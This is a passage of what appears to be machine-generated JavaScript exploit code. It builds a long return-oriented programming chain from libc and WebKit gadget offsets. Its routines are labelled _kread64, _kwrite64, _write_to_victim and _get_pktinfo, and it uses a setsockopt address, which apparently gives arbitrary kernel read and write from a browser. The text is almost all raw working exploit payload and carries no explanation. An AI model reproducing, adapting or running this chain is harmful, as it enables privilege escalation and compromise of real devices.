libc_base+430587,
libc_base+768796,
//L6639:
ropchain+354504,//L6638
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+196160,//_get_pktinfo
//L6638:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+354592,//L6641
webkit_base+4687784,
libc_base+713278
]);
//L6640:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6641:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+354704,//L6642
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+354736,//L6644
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+354720,//L6643
webkit_base+4687784,
libc_base+165442
]);
//L6642:
db([0,0]);
set_gadget(libc_base+772328,);
//L6643:
db([0,0]);
set_gadget(libc_base+768796,);
//L6644:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+354880,//L6647
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+354848,//L6645
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+354864,//L6646
webkit_base+4687784,
libc_base+165442
]);
//L6645:
db([0,0]);
set_gadget(libc_base+772328,);
//L6646:
db([0,0]);
set_gadget(libc_base+768796,);
//L6647:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+354976,//L6650
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6648:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6650:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+355064,//L6652
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+355080,//L6653
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6652:
db([0,0]);
set_gadget(libc_base+772328,);
//L6653:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+355224,//L6656
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+355192,//L6654
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+355208,//L6655
webkit_base+4687784,
libc_base+165442
]);
//L6654:
db([0,0]);
set_gadget(libc_base+772328,);
//L6655:
db([0,0]);
set_gadget(libc_base+768796,);
//L6656:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
//L6657:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L6658:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6659:
db([0,0]);
set_gadget(libc_base+772328,);
//L6660:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+355472,//L6661
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+355488,//L6662
webkit_base+4687784,
libc_base+772328
]);
//L6661:
db([0,0]);
set_gadget(libc_base+768796,);
//L6662:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+355600,//L6663
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+355616,//L6664
webkit_base+4687784,
libc_base+772328
]);
//L6663:
db([0,0]);
set_gadget(libc_base+768796,);
//L6664:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+355784,//L6666
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+355800,//L6667
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+355768,//L6665
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6665:
db([0,0]);
set_gadget(libc_base+165442,);
//L6666:
db([0,0]);
set_gadget(libc_base+768796,);
//L6667:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+355928,//L6670
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+355960,//L6672
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+355944,//L6671
webkit_base+4687784,
libc_base+713278
]);
//L6669:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6670:
db([0,0]);
set_gadget(libc_base+165442,);
//L6671:
db([0,0]);
set_gadget(libc_base+768796,);
//L6672:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+356072,//L6673+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+356064,//L6673
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6673:
db([0,0]);
set_gadgets([
ropchain+356088,//L6673+24
ropchain+356928,//L6668
libc_base+713278,
ropchain+356144,//L6676
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6674:
db([4294967268,4294967295]);// -0x1c
set_gadget(libc_base+772328,);
//L6676:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+356232,//L6678
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+356248,//L6679
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6678:
db([0,0]);
set_gadget(libc_base+772328,);
//L6679:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+356408,//L6681
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+356440,//L6683
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+356392,//L6680
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+356424,//L6682
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6680:
db([0,0]);
set_gadget(libc_base+165442,);
//L6681:
db([0,0]);
set_gadget(libc_base+772328,);
//L6682:
db([0,0]);
set_gadget(libc_base+768796,);
//L6683:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+356520,//L6684
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+356536,//L6685
webkit_base+4687784,
libc_base+165442
]);
//L6684:
db([0,0]);
set_gadget(libc_base+768796,);
//L6685:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+356664,//L6687
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+356680,//L6688
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+356648,//L6686
webkit_base+4687784,
libc_base+165442
]);
//L6686:
db([0,0]);
set_gadget(libc_base+772328,);
//L6687:
db([0,0]);
set_gadget(libc_base+768796,);
//L6688:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+356784,//L6689
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+356800,//L6690
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6689:
db([0,0]);
set_gadget(libc_base+768796,);
//L6690:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+356920,//L6691
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+356904,//L6692
webkit_base+4687784,
libc_base+768796
]);
//L6692:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6691:
db([0,0]);
//L6668:
//L6693:
set_gadgets([
libc_base+713278,
ropchain+356984,//L6696
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6694:
db([4294967268,4294967295]);// -0x1c
set_gadget(libc_base+772328,);
//L6696:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+357072,//L6698
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+357088,//L6699
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6698:
db([0,0]);
set_gadget(libc_base+772328,);
//L6699:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+357248,//L6701
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+357280,//L6703
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+357232,//L6700
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+357264,//L6702
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6700:
db([0,0]);
set_gadget(libc_base+165442,);
//L6701:
db([0,0]);
set_gadget(libc_base+772328,);
//L6702:
db([0,0]);
set_gadget(libc_base+768796,);
//L6703:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+357376,//L6705
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+357360,//L6704
webkit_base+4687784,
libc_base+165442
]);
//L6704:
db([0,0]);
set_gadget(libc_base+768796,);
//L6705:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+357464,//L6707
webkit_base+4687784,
libc_base+713278
]);
//L6706:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L6707:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+357536,//L6710
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6708:
db([4294967268,4294967295]);// -0x1c
set_gadget(libc_base+772328,);
//L6710:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+357600,//L6712
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6712:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+489696,//pop rsp
ropchain+350528,//L6540
//L6573:
libc_base+768796
]);
//L6713:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6714:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L6715:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+357888,//L6717
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+357904,//L6718
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+357872,//L6716
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6716:
db([0,0]);
set_gadget(libc_base+165442,);
//L6717:
db([0,0]);
set_gadget(libc_base+768796,);
//L6718:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+358032,//L6720
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+358048,//L6721
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+358016,//L6719
webkit_base+4687784,
libc_base+165442
]);
//L6719:
db([0,0]);
set_gadget(libc_base+772328,);
//L6720:
db([0,0]);
set_gadget(libc_base+768796,);
//L6721:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+358152,//L6722
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+358168,//L6723
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6722:
db([0,0]);
set_gadget(libc_base+768796,);
//L6723:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+358288,//L6724
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+358272,//L6725
webkit_base+4687784,
libc_base+768796
]);
//L6725:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6724:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+358376,//L6727
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+358360,//L6726
webkit_base+4687784,
libc_base+165442
]);
//L6726:
db([0,0]);
set_gadget(libc_base+768796,);
//L6727:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+358480,//L6728
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+358496,//L6729
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6728:
db([0,0]);
set_gadget(libc_base+768796,);
//L6729:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+358616,//L6730
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+358600,//L6731
webkit_base+4687784,
libc_base+768796
]);
//L6731:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6730:
db([0,0]);
//L6488:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+359944,//L6732
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L6732:
db([0,0]);
//_kread64:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+360016,//L6734
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6734:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+360080,//L6736
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6736:
db([0,0]);
set_gadget(libc_base+713278,);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+360168,//L6739
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6737:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L6739:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+360256,//L6741
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+360272,//L6742
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6741:
db([0,0]);
set_gadget(libc_base+772328,);
//L6742:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+360416,//L6745
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+360384,//L6743
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+360400,//L6744
webkit_base+4687784,
libc_base+165442
]);
//L6743:
db([0,0]);
set_gadget(libc_base+772328,);
//L6744:
db([0,0]);
set_gadget(libc_base+768796,);
//L6745:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+360512,//L6748
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6746:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6748:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+360600,//L6750
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+360616,//L6751
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6750:
db([0,0]);
set_gadget(libc_base+772328,);
//L6751:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+360760,//L6754
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+360728,//L6752
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+360744,//L6753
webkit_base+4687784,
libc_base+165442
]);
//L6752:
db([0,0]);
set_gadget(libc_base+772328,);
//L6753:
db([0,0]);
set_gadget(libc_base+768796,);
//L6754:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6756:
ropchain+360864,//L6755
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+339256,//_write_to_victim
//L6755:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+360952,//L6758
webkit_base+4687784,
libc_base+713278
]);
//L6757:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6758:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+361056,//L6761
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6759:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6761:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+361144,//L6763
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+361160,//L6764
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6763:
db([0,0]);
set_gadget(libc_base+772328,);
//L6764:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+361320,//L6766
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+361352,//L6768
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+361304,//L6765
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+361336,//L6767
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6765:
db([0,0]);
set_gadget(libc_base+165442,);
//L6766:
db([0,0]);
set_gadget(libc_base+772328,);
//L6767:
db([0,0]);
set_gadget(libc_base+768796,);
//L6768:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+361448,//L6770
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+361432,//L6769
webkit_base+4687784,
libc_base+165442
]);
//L6769:
db([0,0]);
set_gadget(libc_base+768796,);
//L6770:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6772:
ropchain+361552,//L6771
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+196160,//_get_pktinfo
//L6771:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+361640,//L6774
webkit_base+4687784,
libc_base+713278
]);
//L6773:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6774:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+361752,//L6775
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+361784,//L6777
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+361768,//L6776
webkit_base+4687784,
libc_base+165442
]);
//L6775:
db([0,0]);
set_gadget(libc_base+772328,);
//L6776:
db([0,0]);
set_gadget(libc_base+768796,);
//L6777:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+361912,//L6779
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+361928,//L6780
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+361896,//L6778
webkit_base+4687784,
libc_base+165442
]);
//L6778:
db([0,0]);
set_gadget(libc_base+772328,);
//L6779:
db([0,0]);
set_gadget(libc_base+768796,);
//L6780:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+362032,//L6781
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+362048,//L6782
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6781:
db([0,0]);
set_gadget(libc_base+768796,);
//L6782:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+362168,//L6783
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+362152,//L6784
webkit_base+4687784,
libc_base+768796
]);
//L6784:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6783:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+362256,//L6786
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+362240,//L6785
webkit_base+4687784,
libc_base+165442
]);
//L6785:
db([0,0]);
set_gadget(libc_base+768796,);
//L6786:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+362360,//L6787
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+362376,//L6788
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6787:
db([0,0]);
set_gadget(libc_base+768796,);
//L6788:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+362496,//L6789
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+362480,//L6790
webkit_base+4687784,
libc_base+768796
]);
//L6790:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6789:
db([0,0]);
//_kwrite64:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+362568,//L6792
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6792:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+362632,//L6794
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6794:
db([0,0]);
set_gadget(libc_base+713278,);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+362720,//L6797
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6795:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L6797:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+362808,//L6799
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+362824,//L6800
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6799:
db([0,0]);
set_gadget(libc_base+772328,);
//L6800:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+362968,//L6803
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+362936,//L6801
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+362952,//L6802
webkit_base+4687784,
libc_base+165442
]);
//L6801:
db([0,0]);
set_gadget(libc_base+772328,);
//L6802:
db([0,0]);
set_gadget(libc_base+768796,);
//L6803:
db([0,0]);
set_gadget(libc_base+713278,);
